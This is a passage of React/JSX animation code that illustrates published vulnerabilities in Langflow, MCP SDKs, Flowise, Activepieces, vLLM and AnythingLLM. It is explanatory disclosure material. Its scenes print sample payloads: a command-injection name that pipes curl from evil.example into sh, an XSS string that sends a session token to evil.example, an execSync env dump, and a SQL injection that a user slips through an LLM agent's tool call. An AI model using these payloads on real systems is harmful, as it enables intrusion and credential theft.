// One demonstration per finding. A scene is a small drawing (Stage) and a
// timeline (build) written in acts: act n owns time n..n+1. Payload strings
// are simplified illustrations of the mechanism each advisory describes.

const P = (l, t, w, h) => ({left: `${l}%`, top: `${t}%`, ...(w != null && {width: `${w}%`}), ...(h != null && {height: `${h}%`})});
const Wires = ({children}) => <svg className="dm-wires" viewBox="0 0 100 50" preserveAspectRatio="none">{children}</svg>;
const W = ({k, d, cold}) => <path className={`dm-w ${k}${cold ? ' is-cold' : ''}`} pathLength="1" d={d}/>;
// Two values in one place: `a` is replaced by `b` during the scene.
const Swap = ({a, b}) => <span style={{position: 'relative', display: 'inline-block'}}><span className="sw-a">{a}</span><span className="sw-b dm-hot" style={{position: 'absolute', left: 0, top: 0}}>{b}</span></span>;

const show = (tl, q, sel, t, extra = {}) => tl.fromTo(q(sel), {autoAlpha: 0, y: 12}, {autoAlpha: 1, y: 0, stagger: .07, ...extra}, t);
const pop = (tl, q, sel, t) => tl.fromTo(q(sel), {autoAlpha: 0, scale: .55}, {autoAlpha: 1, scale: 1, duration: .35, ease: 'back.out(2.2)', stagger: .1}, t);
const type = (tl, q, sel, t, each = .14) => tl.fromTo(q(sel), {clipPath: 'inset(0 100% 0 0)'}, {clipPath: 'inset(0 0% 0 0)', duration: each, ease: 'none', stagger: each}, t);
const draw = (tl, q, sel, t, d = .3) => tl.fromTo(q(sel), {strokeDashoffset: 1}, {strokeDashoffset: 0, duration: d, ease: 'none'}, t);
const fade = (tl, q, sel, t, to = .16) => tl.to(q(sel), {autoAlpha: to, duration: .3}, t);
const glow = (tl, q, sel, t, A) => tl.to(q(sel), {borderColor: A, boxShadow: `0 0 34px -8px ${A}`, duration: .3}, t);
const go = (tl, q, sel, t, vars, d = .55) => tl.to(q(sel), {...vars, duration: d, ease: 'power2.inOut'}, t);
const swap = (tl, q, scope, t) => { tl.to(q(`${scope} .sw-a`), {autoAlpha: 0, duration: .2}, t); tl.fromTo(q(`${scope} .sw-b`), {autoAlpha: 0}, {autoAlpha: 1, duration: .25}, t + .12); };

const langflow = {
  impact: 3.8,
  acts: [
    {label: 'Request', text: 'One HTTP request to the public build endpoint. No credentials, and a data field carrying a flow of the caller’s own.'},
    {label: 'The check', text: 'The endpoint is public on purpose. The only question it asks is whether the flow is public.'},
    {label: 'The swap', text: 'The caller’s data is passed on in place of the flow its owner saved.'},
    {label: 'Build', text: 'Building the graph instantiates each node from its code field, and that code goes through exec().'},
    {label: 'Execution', text: 'The caller’s Python runs as the Langflow server, next to its keys, database credentials and files.'},
  ],
  Stage: () => <>
    <Wires>
      <line className="dm-wall" x1="35.5" y1="3" x2="35.5" y2="47"/>
      <W k="w-in" d="M32 13 H38"/><W k="w-db" cold d="M50 28.5 V31"/><W k="w-swap" d="M50 40 V35.5"/>
      <W k="w-build" d="M61 33 H63.5 V7.5 H66"/><W k="w-exec" d="M81 9.5 V14"/><W k="w-run" d="M82 24.5 V28"/>
    </Wires>
    <span className="dm-note n-out" style={P(2, 4)}>Outside · no account</span>
    <span className="dm-note n-in" style={P(38, 4)}>Inside · Langflow server</span>
    <div className="dm-card s-req" style={P(2, 12, 30)}><h5>HTTP request</h5>
      <code className="dm-l"><b>POST</b> /api/v1/build_public_tmp/{'{id}'}/flow</code>
      <code className="dm-l">Authorization: <i>none</i></code>
      <code className="dm-l">{'{ "data": { "nodes": [ {'}</code>
      <code className="dm-l">{'    "code": "'}<i>import os; os.environ</i>"</code>
      <code className="dm-l">{'} ] } }'}</code>
    </div>
    <span className="dm-chip is-line s-g" style={P(38, 18)}>flow is public: yes</span>
    <span className="dm-chip s-g" style={P(38, 27)}>login: not required</span>
    <div className="dm-card s-stored" style={P(40, 43, 21)}><h5>Stored flow · saved by owner</h5><code className="dm-l">nodes: [ChatInput, Model]</code></div>
    <div className="dm-card s-slot" style={P(40, 62, 21)}><code className="dm-l">build(flow = <Swap a="stored flow" b="caller’s data"/>)</code></div>
    <div className="dm-card s-caller" style={P(40, 80, 21)}><h5>data · sent by the caller</h5><code className="dm-l">nodes: [<i>custom code</i>]</code></div>
    <span className="dm-chip s-node" style={P(66, 11)}>ChatInput</span>
    <span className="dm-chip s-node s-code" style={P(76, 11)}>Custom code</span>
    <span className="dm-chip s-node" style={P(89.5, 11)}>Output</span>
    <div className="dm-card s-exec" style={P(66, 28, 32)}><h5>Graph build · code validation</h5>
      <code className="dm-l">prepare_global_scope(node.code)</code>
      <code className="dm-l"><b>exec(</b><i>caller’s Python</i><b>)</b></code>
    </div>
    <div className="dm-card s-server" style={P(66, 56, 32)}><h5>Langflow server process</h5>
      <code className="dm-l">OPENAI_API_KEY=<i>sk-••••••••••</i></code>
      <code className="dm-l">DATABASE_URL=<i>postgres://••••</i></code>
      <code className="dm-l"><i>.env   flows.db   files</i></code>
    </div>
    <span className="dm-chip is-hot s-out" style={P(71, 89)}>readable by the caller</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.n-out', 0); show(tl, q, '.s-req', .05); type(tl, q, '.s-req .dm-l', .2);
    draw(tl, q, '.w-in', 1); show(tl, q, '.n-in', 1.1); pop(tl, q, '.s-g', 1.3);
    show(tl, q, '.s-stored', 2); show(tl, q, '.s-slot', 2.1); draw(tl, q, '.w-db', 2.2, .15); show(tl, q, '.s-caller', 2.35);
    fade(tl, q, '.s-stored, .w-db', 2.6); draw(tl, q, '.w-swap', 2.6, .2); swap(tl, q, '.s-slot', 2.7); glow(tl, q, '.s-slot, .s-caller', 2.75, A);
    draw(tl, q, '.w-build', 3, .3); pop(tl, q, '.s-node', 3.2); glow(tl, q, '.s-code', 3.5, A); draw(tl, q, '.w-exec', 3.55, .12); show(tl, q, '.s-exec', 3.62); glow(tl, q, '.s-exec', 3.8, A);
    draw(tl, q, '.w-run', 4, .12); show(tl, q, '.s-server', 4.1); type(tl, q, '.s-server .dm-l', 4.25); pop(tl, q, '.s-out', 4.75);
  },
};

const mcpPython = {
  impact: 3.75,
  acts: [
    {label: 'Credentials', text: 'The client holds credentials that one authorization server issued.'},
    {label: 'Discovery', text: 'It connects to an MCP server, which answers with metadata naming an authorization server.'},
    {label: 'No check', text: 'The SDK accepts that metadata. Nothing compares the issuer with the one the credentials belong to.'},
    {label: 'Redirected', text: 'The token request, with the client secret and authorization code, goes where the server said.'},
    {label: 'The fix', text: 'After the fix the client settles the expected issuer first and refuses anything else.'},
  ],
  Stage: () => <>
    <Wires>
      <W k="w-real" cold d="M27 19 C45 19 50 7 70 7"/><W k="w-mcp" d="M15 29 V36 H38"/>
      <W k="w-meta" d="M50 31 V27"/><W k="w-back" d="M38 20 H27"/><W k="w-steal" d="M27 24 C48 24 52 38 70 38"/>
    </Wires>
    <div className="dm-card s-client" style={P(3, 30, 24)}><h5>Your application · SDK OAuth client</h5>
      <code className="dm-l">client_id: <b>app-01</b></code>
      <code className="dm-l">client_secret: <i>••••••••</i></code>
      <code className="dm-l s-iss">expected issuer: <Swap a="(none)" b="auth.corp.example"/></code>
    </div>
    <span className="dm-chip is-line s-key" style={P(6, 66)}>client_secret + code</span>
    <div className="dm-card s-real" style={P(70, 6, 27)}><h5>Real authorization server</h5><code className="dm-l">https://auth.corp.example</code><code className="dm-l">issued these credentials</code></div>
    <div className="dm-card s-mcp" style={P(38, 62, 24)}><h5>MCP server · untrusted</h5><code className="dm-l">mcp.vendor.example</code></div>
    <div className="dm-card s-meta" style={P(38, 28, 24)}><h5>Protected resource metadata</h5>
      <code className="dm-l">authorization_servers: [</code>
      <code className="dm-l">  "<i>https://auth.evil.example</i>"</code>
      <code className="dm-l">]</code>
    </div>
    <span className="dm-chip is-hot s-skip" style={P(5, 16)}>issuer not checked</span>
    <div className="dm-card s-evil" style={P(70, 66, 27)}><h5>Attacker token endpoint</h5>
      <code className="dm-l">https://auth.evil.example/token</code>
      <code className="dm-l s-got">received: <i>secret, code, verifier</i></code>
    </div>
    <span className="dm-chip is-hot s-err" style={P(36, 86)}>OAuthFlowError: issuer mismatch</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-client', 0); show(tl, q, '.s-real', .2); draw(tl, q, '.w-real', .3, .4); pop(tl, q, '.s-key', .6);
    show(tl, q, '.s-mcp', 1); draw(tl, q, '.w-mcp', 1.05, .3); draw(tl, q, '.w-meta', 1.4, .1); show(tl, q, '.s-meta', 1.45); type(tl, q, '.s-meta .dm-l', 1.55);
    draw(tl, q, '.w-back', 2, .25); glow(tl, q, '.s-meta', 2.1, A); pop(tl, q, '.s-skip', 2.4);
    fade(tl, q, '.s-real, .w-real', 3); show(tl, q, '.s-evil', 3.05); draw(tl, q, '.w-steal', 3.15, .4);
    go(tl, q, '.s-key', 3.2, {left: '73%', top: '86%'}, .55); type(tl, q, '.s-got', 3.75, .2); glow(tl, q, '.s-evil', 3.8, A);
    swap(tl, q, '.s-iss', 4); fade(tl, q, '.s-skip', 4, 0); glow(tl, q, '.s-client', 4.1, A);
    go(tl, q, '.s-key', 4.2, {left: '6%', top: '66%'}, .45); fade(tl, q, '.w-steal, .s-evil', 4.25); tl.to(q('.s-real, .w-real'), {autoAlpha: 1, duration: .3}, 4.3); pop(tl, q, '.s-err', 4.6);
  },
};

const mcpTypescript = {
  impact: 3.8,
  acts: [
    {label: 'Saved', text: 'Credentials from an earlier sign-in sit in the client’s store, with no record of who issued them.'},
    {label: 'Advertised', text: 'An MCP server advertises its own authorization server in its resource metadata.'},
    {label: 'Followed', text: 'The client follows it. No prompt, no click: the user is not involved.'},
    {label: 'Handed over', text: 'The stored refresh token and client secret are sent to the attacker’s server.'},
    {label: 'The fix', text: 'Saved credentials now carry their issuer, and the client will not show them to a different one.'},
  ],
  Stage: () => <>
    <Wires><W k="w-ad" d="M54 22 V26"/><W k="w-store" d="M33 31 H42"/><W k="w-send" d="M66 31 H69 V23 H72"/></Wires>
    <div className="dm-box s-vault" style={P(3, 12, 30, 76)}><h5>Credential store · saved at last sign-in</h5></div>
    <div className="dm-card s-tok s-t1" style={P(6, 22, 24)}><code className="dm-l">refresh_token: <i>rt_••••••••</i></code><code className="dm-l s-iss">issuer: <Swap a="(not recorded)" b="auth.corp.example"/></code></div>
    <div className="dm-card s-tok s-t2" style={P(6, 52, 24)}><code className="dm-l">client_secret: <i>••••••••</i></code><code className="dm-l s-iss">issuer: <Swap a="(not recorded)" b="auth.corp.example"/></code></div>
    <div className="dm-card s-mcp" style={P(42, 8, 24)}><h5>MCP server · untrusted</h5>
      <code className="dm-l">resource metadata</code><code className="dm-l">authorization_servers:</code><code className="dm-l">  <i>auth.evil.example</i></code>
    </div>
    <div className="dm-card s-client" style={P(42, 52, 24)}><h5>SDK OAuth client</h5>
      <code className="dm-l">fetchToken(<i>advertised server</i>)</code><code className="dm-l">user interaction: <b>none</b></code>
    </div>
    <div className="dm-box s-evil" style={P(71, 30, 27, 62)}><h5>Attacker authorization server</h5></div>
    <span className="dm-chip is-hot s-lock" style={P(6, 80)}>bound to its issuer</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-vault', 0); show(tl, q, '.s-tok', .15); glow(tl, q, '.s-tok', .65, A);
    show(tl, q, '.s-mcp', 1); type(tl, q, '.s-mcp .dm-l', 1.15);
    draw(tl, q, '.w-ad', 2, .12); show(tl, q, '.s-client', 2.1); type(tl, q, '.s-client .dm-l', 2.25, .2); draw(tl, q, '.w-store', 2.7, .2);
    show(tl, q, '.s-evil', 3); draw(tl, q, '.w-send', 3.1, .25);
    go(tl, q, '.s-t1', 3.25, {left: '72.5%', top: '40%'}, .5); go(tl, q, '.s-t2', 3.4, {left: '72.5%', top: '66%'}, .5); glow(tl, q, '.s-evil', 3.8, A);
    go(tl, q, '.s-t1', 4, {left: '6%', top: '22%'}, .4); go(tl, q, '.s-t2', 4.08, {left: '6%', top: '52%'}, .4);
    fade(tl, q, '.w-send, .s-evil', 4.1); swap(tl, q, '.s-t1', 4.45); swap(tl, q, '.s-t2', 4.5); pop(tl, q, '.s-lock', 4.7);
    tl.to(q('.s-vault'), {borderStyle: 'solid', borderColor: A, duration: .3}, 4.7);
  },
};

const flowise = {
  impact: 2.8,
  acts: [
    {label: 'Request', text: 'A request to the public prediction API, with an overrideConfig object the caller filled in.'},
    {label: 'The gate', text: 'Overrides are meant to pass a per-flow switch. On this flow the switch is off.'},
    {label: 'Around it', text: 'Two other code paths copy the same object straight into the execution context, with no switch.'},
    {label: 'Resolved', text: 'Node templates read their values from that context, so they now resolve to what the caller sent.'},
    {label: 'Wrong session', text: 'Memory and model nodes run against the chosen chat ID. Another session’s history is read or written.'},
  ],
  Stage: () => <>
    <Wires>
      <W k="w-gate" cold d="M32 9 H38"/><W k="w-by1" d="M32 15 H35 V29 H40"/><W k="w-by2" d="M32 18 H33.8 V35 H40"/>
      <W k="w-tpl" d="M66 32 H68 V10 H70"/><W k="w-mem" d="M84 19.5 V23"/>
    </Wires>
    <div className="dm-card s-req" style={P(2, 8, 30)}><h5>POST /api/v1/prediction/:id · no login</h5>
      <code className="dm-l">{'{ "question": "hi",'}</code>
      <code className="dm-l">{'  "overrideConfig": {'}</code>
      <code className="dm-l">    <i>"chatId": "victim-42",</i></code>
      <code className="dm-l">    <i>"chatHistory": [ … ]</i></code>
      <code className="dm-l">{'} }'}</code>
    </div>
    <div className="dm-card s-gate" style={P(38, 6, 24)}><h5>replaceInputsWithConfig()</h5><code className="dm-l">apiOverrideStatus: <b>off</b></code></div>
    <span className="dm-chip is-line s-stop" style={P(44, 25)}>stopped here</span>
    <span className="dm-note is-hot s-spread" style={P(36, 44)}>{'{ ...overrideConfig }'} · two more places</span>
    <div className="dm-card s-conf" style={P(40, 52, 26)}><h5>flowConfig · server-side context</h5>
      <code className="dm-l c1">chatId: <Swap a={'"caller-7"'} b={'"victim-42"'}/></code>
      <code className="dm-l c2">sessionId: <Swap a={'"s-7"'} b={'"victim-42"'}/></code>
      <code className="dm-l c3">chatHistory: <Swap a="[ ]" b="[ injected ]"/></code>
    </div>
    <div className="dm-card s-tpl" style={P(70, 8, 28)}><h5>Node template</h5><code className="dm-l">memory key: {'{{$flow.chatId}}'}</code><code className="dm-l">resolves to <i>"victim-42"</i></code></div>
    <div className="dm-card s-mem" style={P(70, 46, 28)}><h5>Memory node · someone else’s session</h5>
      <code className="dm-l">user: my order number is ••••</code><code className="dm-l">assistant: thanks, noted</code><code className="dm-l"><i>+ caller’s injected history</i></code>
    </div>
    <span className="dm-chip is-hot s-out" style={P(74, 86)}>returned to the caller</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-req', 0); type(tl, q, '.s-req .dm-l', .15);
    draw(tl, q, '.w-gate', 1, .2); show(tl, q, '.s-gate', 1.15); pop(tl, q, '.s-stop', 1.5);
    draw(tl, q, '.w-by1', 2, .3); draw(tl, q, '.w-by2', 2.1, .3); show(tl, q, '.s-spread', 2.2); show(tl, q, '.s-conf', 2.35);
    swap(tl, q, '.c1', 2.6); swap(tl, q, '.c2', 2.7); swap(tl, q, '.c3', 2.8); glow(tl, q, '.s-conf', 2.8, A);
    draw(tl, q, '.w-tpl', 3, .3); show(tl, q, '.s-tpl', 3.25); type(tl, q, '.s-tpl .dm-l', 3.4, .2); glow(tl, q, '.s-tpl', 3.8, A);
    draw(tl, q, '.w-mem', 4, .12); show(tl, q, '.s-mem', 4.1); type(tl, q, '.s-mem .dm-l', 4.25); pop(tl, q, '.s-out', 4.75);
  },
};

const apCommand = {
  impact: 3.85,
  acts: [
    {label: 'A name', text: 'A user who can edit a flow gives a code step a name. The name contains shell syntax.'},
    {label: 'Validation', text: 'The API accepts it. The only rule is that a name is a string.'},
    {label: 'Assembly', text: 'The worker builds the step’s path from its name and puts it into a build command, as one string.'},
    {label: 'The shell', text: 'That string runs through /bin/sh, which reads the semicolon as the end of one command and the start of another.'},
    {label: 'Too early', text: 'All of this is the compile step. The sandbox is created later, for running the code.'},
  ],
  Stage: () => <>
    <Wires><W k="w-a" d="M33 13 H38"/><W k="w-b" d="M67 19.5 V21.5"/></Wires>
    <div className="dm-card s-form" style={P(3, 8, 30)}><h5>Code step · name</h5>
      <code className="dm-l s-name"><i>x; curl evil.example/p | sh #</i></code>
      <code className="dm-l s-valid">z.string() <b>passes</b></code>
    </div>
    <div className="dm-card s-cmd" style={P(38, 8, 59)}><h5>Worker · build command, one string</h5>
      <code className="dm-l">bun build /codes/<i>x; curl evil.example/p | sh #</i>/index.ts</code>
    </div>
    <div className="dm-card s-sh" style={P(38, 43, 59)}><h5>/bin/sh -c</h5>
      <code className="dm-l">$ bun build /codes/x</code>
      <code className="dm-l">$ <i>curl evil.example/p | sh</i>      <b>runs as the worker user</b></code>
    </div>
    <div className="dm-box s-stage s-compile" style={P(3, 76, 30, 17)}><h5>1 · compile</h5></div>
    <div className="dm-box s-stage s-sandbox" style={P(35, 76, 30, 17)}><h5>2 · sandbox created</h5></div>
    <div className="dm-box s-stage" style={P(67, 76, 30, 17)}><h5>3 · user code runs</h5></div>
    <span className="dm-chip is-hot s-here" style={P(6, 81.5)}>the commands ran here</span>
    <span className="dm-note s-late" style={P(38, 83)}>does not exist yet</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-form', 0); type(tl, q, '.s-name', .2, .5);
    tl.fromTo(q('.s-valid'), {autoAlpha: 0}, {autoAlpha: 1}, 1.2); glow(tl, q, '.s-form', 1.45, A);
    draw(tl, q, '.w-a', 2, .15); show(tl, q, '.s-cmd', 2.1); type(tl, q, '.s-cmd .dm-l', 2.25, .5); glow(tl, q, '.s-cmd', 2.8, A);
    draw(tl, q, '.w-b', 3, .1); show(tl, q, '.s-sh', 3.1); type(tl, q, '.s-sh .dm-l', 3.25, .28); glow(tl, q, '.s-sh', 3.85, A);
    show(tl, q, '.s-stage', 4); tl.to(q('.s-compile'), {borderStyle: 'solid', borderColor: A, duration: .3}, 4.35); pop(tl, q, '.s-here', 4.4); show(tl, q, '.s-late', 4.65);
  },
};

const apIsolate = {
  impact: 2.6,
  acts: [
    {label: 'A module', text: 'A code step compiles to a module. This one has code at the top level and an exported function.'},
    {label: 'Loaded', text: 'The engine loads it with importFresh(), a wrapper around require(). Loading a module runs its top level.'},
    {label: 'Wrong side', text: 'That top-level code executes in the host Node.js process, with the whole Node API.'},
    {label: 'What went in', text: 'Only the exported function is moved into the V8 isolate. The sandbox holds the harmless part.'},
    {label: 'The fix', text: 'The module is now read as text and run inside the isolate, where require does not exist.'},
  ],
  Stage: () => <>
    <Wires><W k="w-load" d="M33 12 H39"/><W k="w-fn" d="M33 24 H35.5 V44 H68"/></Wires>
    <div className="dm-box s-host" style={P(36.5, 7, 61, 86)}><h5>Host Node.js process · full API</h5></div>
    <div className="dm-box s-iso" style={P(66, 30, 29, 46)}><h5>V8 isolate · the sandbox</h5></div>
    <div className="dm-card s-file" style={P(3, 10, 30)}><h5>Compiled code step</h5>
      <code className="dm-l s-top"><i>const cp = require('child_process')</i></code>
      <code className="dm-l s-top"><i>cp.execSync('env &gt; /tmp/x')</i></code>
      <code className="dm-l">export const code = async () =&gt;</code>
      <code className="dm-l">  ({'{ ok: true }'})</code>
    </div>
    <span className="dm-chip is-line s-loader" style={P(5, 44)}>importFresh(module)</span>
    <div className="dm-card s-ran" style={P(39, 16, 24)}><h5>Top level runs here</h5>
      <code className="dm-l">require('child_process') <b>ok</b></code><code className="dm-l">execSync(…) <b>ok</b></code>
    </div>
    <div className="dm-card s-fn" style={P(68.5, 40, 24)}><h5>Exported function</h5><code className="dm-l">code()</code></div>
    <span className="dm-chip s-sec s-s1" style={P(40, 58)}>AP_ENCRYPTION_KEY</span>
    <span className="dm-chip s-sec s-s2" style={P(40, 70)}>AP_JWT_SECRET</span>
    <span className="dm-note is-hot s-gone" style={P(4, 60)}>read by the step’s author</span>
    <span className="dm-chip is-hot s-fix" style={P(69, 62)}>require: ReferenceError</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-file', 0); type(tl, q, '.s-file .dm-l', .15); show(tl, q, '.s-host', .6); show(tl, q, '.s-iso', .7);
    pop(tl, q, '.s-loader', 1); draw(tl, q, '.w-load', 1.25, .25); glow(tl, q, '.s-file', 1.5, A);
    show(tl, q, '.s-ran', 2); type(tl, q, '.s-ran .dm-l', 2.15, .2); glow(tl, q, '.s-ran', 2.6, A); pop(tl, q, '.s-sec', 2.55);
    draw(tl, q, '.w-fn', 3, .35); show(tl, q, '.s-fn', 3.3);
    go(tl, q, '.s-s1', 3.45, {left: '5%', top: '68%'}, .45); go(tl, q, '.s-s2', 3.55, {left: '5%', top: '79%'}, .45);
    tl.to(q('.s-sec'), {color: A, borderColor: A, duration: .2}, 3.9); show(tl, q, '.s-gone', 3.9);
    fade(tl, q, '.s-ran, .w-load, .s-loader', 4); go(tl, q, '.s-s1', 4.05, {left: '40%', top: '58%'}, .4); go(tl, q, '.s-s2', 4.1, {left: '40%', top: '70%'}, .4);
    fade(tl, q, '.s-gone', 4.05, 0); tl.to(q('.s-sec'), {color: '#f3f0f7', borderColor: 'rgba(243,240,247,.2)', duration: .2}, 4.3);
    tl.to(q('.s-iso'), {borderStyle: 'solid', borderColor: A, duration: .3}, 4.4); pop(tl, q, '.s-fix', 4.6);
  },
};

const apXss = {
  impact: 3.8,
  acts: [
    {label: 'A link', text: 'The attacker builds a link to the OAuth callback page, with script in the code parameter.'},
    {label: 'A click', text: 'A signed-in user opens it. Nothing about the page looks unusual.'},
    {label: 'Reflected', text: 'The page writes the parameter into an inline script. The first quote closes the string and the rest becomes code.'},
    {label: 'In the origin', text: 'The script runs as the application. It can read the session token and call the API as the user.'},
    {label: 'The fix', text: 'The value now goes through an escaping template into a meta tag, under a Content-Security-Policy.'},
  ],
  Stage: () => <>
    <Wires><W k="w-link" d="M68 12 H62.5"/><W k="w-leak" d="M45 37 C55 37 60 20 68 19"/></Wires>
    <div className="dm-browser s-browser" style={P(4, 8, 58, 82)}>
      <div className="dm-url"><span className="s-url">app.example/api/redirect?code=<span className="dm-hot">";fetch('//evil.example/?t='+token)//</span></span></div>
    </div>
    <span className="dm-chip s-origin" style={P(6.5, 24)}>origin: app.example · signed in</span>
    <div className="dm-card s-src" style={P(6.5, 38, 53)}><h5>Page source</h5>
      <code className="dm-l">&lt;script&gt;</code>
      <code className="dm-l">  const code = "<i>";fetch('//evil.example/?t='+token)//</i>";</code>
      <code className="dm-l">&lt;/script&gt;</code>
    </div>
    <span className="dm-chip is-hot s-close" style={P(21, 64)}>the string ends at the first quote</span>
    <span className="dm-chip is-line s-token" style={P(34, 76)}>session token</span>
    <div className="dm-card s-evil" style={P(68, 8, 29)}><h5>Attacker</h5><code className="dm-l">sends a crafted link</code><code className="dm-l s-got">received: <i>session token</i></code></div>
    <div className="dm-card s-fix" style={P(68, 52, 29)}><h5>After the fix</h5>
      <code className="dm-l">&lt;meta content="<b>&amp;quot;;fetch…</b>"&gt;</code><code className="dm-l">escaped by the template</code><code className="dm-l">Content-Security-Policy <b>set</b></code>
    </div>
    <svg className="dm-pointer s-ptr" style={P(78, 70)} viewBox="0 0 20 20"><path d="M2 1l14 8-6 2-2 6z"/></svg>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-evil', 0); tl.fromTo(q('.s-got'), {autoAlpha: 0}, {autoAlpha: 0, duration: .01}, 0);
    show(tl, q, '.s-browser', .15); draw(tl, q, '.w-link', .4, .15); type(tl, q, '.s-url', .5, .45);
    show(tl, q, '.s-ptr', 1); go(tl, q, '.s-ptr', 1.1, {left: '30%', top: '13%'}, .5); tl.to(q('.s-ptr'), {scale: .75, duration: .08, yoyo: true, repeat: 1}, 1.65); pop(tl, q, '.s-origin', 1.75);
    show(tl, q, '.s-src', 2); type(tl, q, '.s-src .dm-l', 2.15, .2); glow(tl, q, '.s-src', 2.75, A); pop(tl, q, '.s-close', 2.75);
    pop(tl, q, '.s-token', 3); draw(tl, q, '.w-leak', 3.2, .35); go(tl, q, '.s-token', 3.25, {left: '71%', top: '36%'}, .5);
    tl.to(q('.s-got'), {autoAlpha: 1, duration: .2}, 3.8); glow(tl, q, '.s-evil', 3.8, A);
    show(tl, q, '.s-fix', 4.05); type(tl, q, '.s-fix .dm-l', 4.2, .18); fade(tl, q, '.s-close, .w-leak', 4.1, 0); glow(tl, q, '.s-fix', 4.75, A);
  },
};

const CELLS = 192, WRITTEN = 96;
const vllm = {
  impact: 4.1,
  acts: [
    {label: 'Leftovers', text: 'GPU memory is reused between requests. Another tenant’s tensor data is still sitting in it.'},
    {label: 'Allocation', text: 'vLLM allocates the full output tensor with torch::empty, which reserves memory without clearing it.'},
    {label: 'Truncation', text: 'The element count is 64 bits wide. The kernels take it as a 32-bit int, so a large count loses its top half.'},
    {label: 'Short write', text: 'The CUDA kernel fills only that truncated number of elements and returns without an error.'},
    {label: 'The leak', text: 'The rest of the buffer still holds the other tenant’s data, and it flows into this model’s computation.'},
  ],
  Stage: () => <>
    <Wires><W k="w-leak" d="M66 26 H68.5 V36 H70"/></Wires>
    <span className="dm-chip s-tenant" style={P(4, 16)}>tenant A · previous request</span>
    <div className="dm-box s-alloc" style={P(3, 30, 64.5, 34)}><h5>torch::empty(m × n) · reserved, not cleared</h5></div>
    <div className="dm-cells s-cells" style={{...P(4.2, 35, 62), gridTemplateColumns: 'repeat(32, 1fr)'}}>
      {Array.from({length: CELLS}, (_, i) => <i key={i} className={i < WRITTEN ? 'c-w' : 'c-s'}/>)}
    </div>
    <span className="dm-chip is-line s-kernel" style={P(4, 69)}>CUDA kernel writes k elements, then stops</span>
    <span className="dm-chip is-hot s-stale" style={P(34, 69)}>never written: still tenant A’s data</span>
    <span className="dm-note s-scale" style={P(4, 90)}>Illustrative count, not to scale</span>
    <div className="dm-card s-math" style={P(70, 6, 27)}><h5>Element count</h5>
      <code className="dm-l">int64 m × n = <b>4,294,967,392</b></code>
      <code className="dm-l"><s>00000001</s> <i>00000000 … 01100000</i></code>
      <code className="dm-l">int k = <i>low 32 bits</i></code>
    </div>
    <span className="dm-big dm-hot s-k" style={{...P(71, 37), fontSize: '9cqw'}}>96</span>
    <div className="dm-card s-model" style={P(70, 66, 27)}><h5>Model computation · tenant B</h5><code className="dm-l">weights <i>+ residual data</i></code></div>
  </>,
  build(tl, q, A) {
    pop(tl, q, '.s-tenant', 0);
    tl.fromTo(q('.s-cells i'), {autoAlpha: 0, backgroundColor: 'rgba(243,240,247,.5)'}, {autoAlpha: 1, backgroundColor: 'rgba(243,240,247,.5)', duration: .2, stagger: {amount: .6, from: 'random'}}, .15);
    show(tl, q, '.s-alloc', 1); tl.to(q('.s-alloc'), {borderStyle: 'solid', duration: .2}, 1.4);
    show(tl, q, '.s-math', 2); type(tl, q, '.s-math .dm-l', 2.15, .18); pop(tl, q, '.s-k', 2.7);
    pop(tl, q, '.s-kernel', 3); tl.to(q('.c-w'), {backgroundColor: A, boxShadow: `0 0 8px ${A}`, duration: .12, stagger: {amount: .6}}, 3.15);
    fade(tl, q, '.s-kernel', 4, .3); pop(tl, q, '.s-stale', 4);
    tl.to(q('.c-s'), {backgroundColor: '#ffffff', boxShadow: '0 0 10px rgba(255,255,255,.7)', duration: .15, stagger: {amount: .35, from: 'end'}}, 4.1);
    draw(tl, q, '.w-leak', 4.45, .2); show(tl, q, '.s-model', 4.55); glow(tl, q, '.s-model', 4.8, A); show(tl, q, '.s-scale', 4.6);
  },
};

const anythingllm = {
  impact: 4.55,
  acts: [
    {label: 'A message', text: 'A workspace user asks the agent for a table’s schema. The table name is not a table name.'},
    {label: 'Tool call', text: 'The model turns the request into a tool call and copies the name into its arguments.'},
    {label: 'Half a check', text: 'The handler confirms the database is one it knows. It does not look at the table name.'},
    {label: 'Concatenation', text: 'The connector pastes the name into the query text. The quote ends the value and a second statement begins.'},
    {label: 'Executed', text: 'The database runs both statements with the agent’s account, and the results come back through the chat.'},
  ],
  Stage: () => <>
    <Wires><W k="w-1" d="M17 19 V23"/><W k="w-2" d="M33 28 H35.5 V11 H38"/><W k="w-3" d="M51 20 V23"/><W k="w-4" d="M84 23 V21"/></Wires>
    <div className="dm-bubble is-them s-msg" style={P(3, 8)}>Show me the schema for <span className="dm-hot">logs'; CREATE TABLE pwned(x int);--</span></div>
    <div className="dm-card s-llm" style={P(3, 46, 30)}><h5>LLM · tool call</h5>
      <code className="dm-l">tool: <b>sql-get-table-schema</b></code>
      <code className="dm-l">database_id: "main"</code>
      <code className="dm-l">table_name: "<i>logs'; CREATE TABLE …</i>"</code>
    </div>
    <div className="dm-card s-handler" style={P(38, 8, 26)}><h5>Tool handler</h5>
      <code className="dm-l">database_id known? <b>yes</b></code>
      <code className="dm-l">table_name checked? <i>no</i></code>
    </div>
    <div className="dm-card s-query" style={P(38, 46, 59)}><h5>getTableSchemaSql() · string concatenation</h5>
      <code className="dm-l">SELECT column_name FROM information_schema.columns</code>
      <code className="dm-l">WHERE table_name = '<i>logs'; CREATE TABLE pwned(x int);--</i>'</code>
    </div>
    <span className="dm-chip is-hot s-second" style={P(58, 80)}>second statement starts here</span>
    <div className="dm-card s-db" style={P(70, 8, 27)}><h5>Connected database</h5>
      <code className="dm-l">logs</code><code className="dm-l">users</code><code className="dm-l">orders</code><code className="dm-l s-new"><i>pwned</i>   <b>new table</b></code>
    </div>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-msg', 0); glow(tl, q, '.s-msg', .5, A);
    draw(tl, q, '.w-1', 1, .12); show(tl, q, '.s-llm', 1.1); type(tl, q, '.s-llm .dm-l', 1.25, .2);
    draw(tl, q, '.w-2', 2, .3); show(tl, q, '.s-handler', 2.25); type(tl, q, '.s-handler .dm-l', 2.4, .2); glow(tl, q, '.s-handler', 2.85, A);
